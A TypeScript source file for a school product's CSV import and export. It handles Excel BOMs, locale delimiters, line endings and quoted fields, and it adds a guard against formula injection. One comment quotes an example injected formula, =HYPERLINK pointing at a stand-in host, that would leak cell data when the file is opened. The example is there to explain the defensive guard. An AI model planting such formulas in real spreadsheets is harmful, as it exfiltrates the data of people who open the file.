/**
 * A CSV reader for files that came out of a real school's computer.
 *
 * This exists because F-1601 — bulk import, "the practical blocker to any
 * pilot" — turns entirely on reading a spreadsheet a head teacher exported
 * from Excel, and the ways that file differs from the RFC are not exotic
 * edge cases. They are the common case:
 *
 *   • Excel writes a UTF-8 BOM. Consume it and the first header becomes
 *     "﻿roll_no", which matches nothing, so every row reports a
 *     missing roll number and the operator concludes the importer is
 *     broken. This is the single most common real-world CSV failure.
 *
 *   • Excel on a Bangla or European locale writes SEMICOLONS, because the
 *     list separator follows the locale. The file looks fine when opened
 *     in Excel and parses as one giant column anywhere else.
 *
 *   • Line endings are CRLF from Windows, LF from a Mac export, and
 *     occasionally lone CR from something older.
 *
 *   • A guardian's name contains a comma, so the field is quoted; an
 *     address contains a newline INSIDE the quotes.
 *
 * Everything here is about those. There is no dependency: the TRD's
 * dependency budget does not stretch to a CSV library, and the subset that
 * matters is small enough to own and test.
 *
 * Deliberately NOT here: type coercion, header aliasing, and anything that
 * knows what a roll number is. This returns strings keyed by header. What
 * those strings mean belongs to the importer that understands the domain.
 */

export interface CsvRow {
  /** 1-based line number in the ORIGINAL file, header included. */
  lineNo: number;
  /** Header → cell, trimmed. Missing trailing cells read as ''. */
  cells: Record<string, string>;
  /** Cells in file order, for reporting a ragged row honestly. */
  raw: string[];
}

export interface CsvTable {
  headers: string[];
  rows: CsvRow[];
  delimiter: string;
  /** Rows whose cell count disagreed with the header. Never dropped silently. */
  ragged: Array<{ lineNo: number; expected: number; got: number }>;
}

const DELIMITERS = [',', ';', '\t', '|'];

/**
 * Which separator is this file using?
 *
 * Counted on the header line only, and outside quotes — a quoted guardian
 * name full of commas in row 1 must not outvote the real delimiter. Ties
 * go to the comma, which is what an unambiguous single-column file is.
 */
export function sniffDelimiter(firstLine: string): string {
  let best = ',';
  let bestCount = 0;
  for (const d of DELIMITERS) {
    let count = 0;
    let inQuotes = false;
    for (let i = 0; i < firstLine.length; i++) {
      const ch = firstLine[i];
      if (ch === '"') {
        if (inQuotes && firstLine[i + 1] === '"') { i++; continue; }
        inQuotes = !inQuotes;
      } else if (ch === d && !inQuotes) {
        count++;
      }
    }
    if (count > bestCount) { best = d; bestCount = count; }
  }
  return best;
}

/**
 * Split the whole text into records of fields.
 *
 * One pass, character by character, because a quoted field may contain the
 * delimiter AND a newline — so neither splitting on lines first nor
 * splitting on the delimiter first is correct, however tempting.
 */
function parseRecords(text: string, delimiter: string): Array<{ lineNo: number; fields: string[] }> {
  const records: Array<{ lineNo: number; fields: string[] }> = [];
  let fields: string[] = [];
  let field = '';
  let inQuotes = false;
  let lineNo = 1;
  let recordStart = 1;
  let sawAny = false;

  const endField = (): void => { fields.push(field); field = ''; sawAny = true; };
  const endRecord = (): void => {
    endField();
    records.push({ lineNo: recordStart, fields });
    fields = [];
    sawAny = false;
    recordStart = lineNo;
  };

  for (let i = 0; i < text.length; i++) {
    const ch = text[i];

    if (inQuotes) {
      if (ch === '"') {
        // "" inside a quoted field is one literal quote.
        if (text[i + 1] === '"') { field += '"'; i++; continue; }
        inQuotes = false;
        continue;
      }
      if (ch === '\n') lineNo++;
      field += ch;
      continue;
    }

    if (ch === '"' && field === '') { inQuotes = true; continue; }
    if (ch === delimiter) { endField(); continue; }

    if (ch === '\r' || ch === '\n') {
      // CRLF is one break, not two. A lone CR is still a break.
      if (ch === '\r' && text[i + 1] === '\n') i++;
      lineNo++;
      // A blank line between records is skipped rather than becoming a row
      // of empty cells — a trailing newline is normal, and every file has
      // one.
      if (fields.length === 0 && field === '' && !sawAny) { recordStart = lineNo; continue; }
      endRecord();
      continue;
    }

    field += ch;
  }

  // Whatever is buffered at EOF is a final record, unless the file simply
  // ended with a newline.
  if (field !== '' || fields.length > 0 || sawAny) endRecord();
  return records;
}

/**
 * Read a CSV file into headers and rows.
 *
 * `text` is the decoded file. Decoding is the caller's problem, with one
 * exception handled here: the BOM, because it is invisible, it is Excel's
 * default, and leaving it attached to the first header silently breaks
 * every row.
 */
export function parseCsv(text: string, opts: { delimiter?: string } = {}): CsvTable {
  // U+FEFF. Not whitespace, not stripped by trim(), and byte-identical to
  // nothing a human can see.
  const clean = text.charCodeAt(0) === 0xfeff ? text.slice(1) : text;

  const firstBreak = clean.search(/\r\n|\n|\r/);
  const firstLine = firstBreak === -1 ? clean : clean.slice(0, firstBreak);
  const delimiter = opts.delimiter ?? sniffDelimiter(firstLine);

  const records = parseRecords(clean, delimiter);
  if (records.length === 0) {
    return { headers: [], rows: [], delimiter, ragged: [] };
  }

  const headers = records[0].fields.map((h) => h.trim());
  const rows: CsvRow[] = [];
  const ragged: CsvTable['ragged'] = [];

  for (const rec of records.slice(1)) {
    // A row of nothing but empty cells is a spreadsheet artefact — Excel
    // emits them for rows a user once touched and cleared. Treating one as
    // a student would report "name required" for a row that is not there.
    if (rec.fields.every((f) => f.trim() === '')) continue;

    if (rec.fields.length !== headers.length) {
      // Reported, not dropped and not repaired. A ragged row usually means
      // an unescaped quote earlier in the file, and quietly padding it
      // would import the wrong values into the right-hand columns.
      ragged.push({ lineNo: rec.lineNo, expected: headers.length, got: rec.fields.length });
    }

    const cells: Record<string, string> = {};
    headers.forEach((h, i) => { cells[h] = (rec.fields[i] ?? '').trim(); });
    rows.push({ lineNo: rec.lineNo, cells, raw: rec.fields });
  }

  return { headers, rows, delimiter, ragged };
}

/**
 * Render rows back to CSV — for the downloadable error list §10.2 requires
 * ("the error list is downloadable so it can be fixed in the source
 * spreadsheet").
 *
 * Always writes a BOM. The file is round-tripping back into the Excel it
 * came from, and without one Excel renders Bangla as mojibake — the same
 * quirk that makes the BOM a problem on the way in makes it mandatory on
 * the way out.
 */
export function toCsv(headers: string[], rows: Array<Record<string, string>>): string {
  const quote = (v: string): string =>
    /[",\r\n]/.test(v) ? `"${v.replace(/"/g, '""')}"` : v;
  const lines = [headers.map(quote).join(',')];
  for (const r of rows) lines.push(headers.map((h) => quote(r[h] ?? '')).join(','));
  return `﻿${lines.join('\r\n')}\r\n`;
}

/* ------------------------------------------------------------------------
 * P11 - data portability.
 *
 * `toCsv` above builds one string and is right for the import error list,
 * which is a handful of rows. An institution export is a different size and
 * a different threat model, so the pieces below sit beside it rather than
 * widening it: same quoting, same BOM, plus row-at-a-time emission and a
 * formula guard.
 * ---------------------------------------------------------------------- */

/**
 * The byte order mark, written once at the top of an export.
 *
 * Excel on a Bangladeshi office machine reads a BOM-less UTF-8 file in the
 * system codepage and renders every Bangla name as mojibake. The school then
 * believes the export is broken, which for their purposes it is.
 */
export const CSV_BOM = '\ufeff';

/**
 * Cells a spreadsheet would EXECUTE rather than display.
 *
 * A student's name is free text a person typed, and Excel, LibreOffice and
 * Sheets all treat a leading =, +, -, @, tab or CR as the start of a
 * formula. `=HYPERLINK("http://x/?"&A1)` sitting in a name field becomes a
 * live exfiltration link the moment a clerk opens the file. The export is
 * the delivery mechanism, so the export is where it has to be stopped.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/**
 * A number or an E.164 phone, which must NOT be defanged - see `csvCell`.
 *
 * The `+` matters as much as the `-`. Every staff and guardian phone in this
 * product is stored E.164 (`+8801711000111`), so a naive guard would prefix
 * an apostrophe onto every phone in every export. That is not merely ugly:
 * this is a PORTABILITY feature, the file is meant to be readable back, and
 * `parseCsv` would then hand the school `'+8801711000111` — a phone number
 * that no longer dials. Fidelity of the value is the point of the artifact.
 *
 * Nothing is given up by the exemption. `+8801711000111` is all digits after
 * the sign, so a spreadsheet evaluates it to the number 8801711000111 and
 * there is no formula to execute; `+SUM(A1)` is not all digits and is still
 * caught.
 */
const PLAIN_NUMBER = /^[+-]?\d+(?:\.\d+)?$/;

/**
 * One cell: neutralised if dangerous, quoted if it needs it, otherwise left
 * exactly as the school typed it.
 *
 * The guard is deliberately narrow. Prefixing everything risky-looking with
 * an apostrophe is the usual advice and it corrupts real data: -500 is a
 * legitimate amount, and '-500 stops being a number in the spreadsheet the
 * school is about to sum. So a purely numeric value is left alone - it
 * cannot be a formula - and only text that genuinely leads with an operator
 * is prefixed. Bangla never starts with one of these characters, so no
 * Bangla name is ever touched.
 */
export function csvCell(value: string): string {
  let v = value;
  if (FORMULA_LEAD.test(v) && !PLAIN_NUMBER.test(v)) v = `'${v}`;
  return /[",\r\n]/.test(v) ? `"${v.replace(/"/g, '""')}"` : v;
}

/** One CRLF-terminated record. CRLF because that is what Excel expects. */
export function csvLine(values: string[]): string {
  return `${values.map(csvCell).join(',')}\r\n`;
}
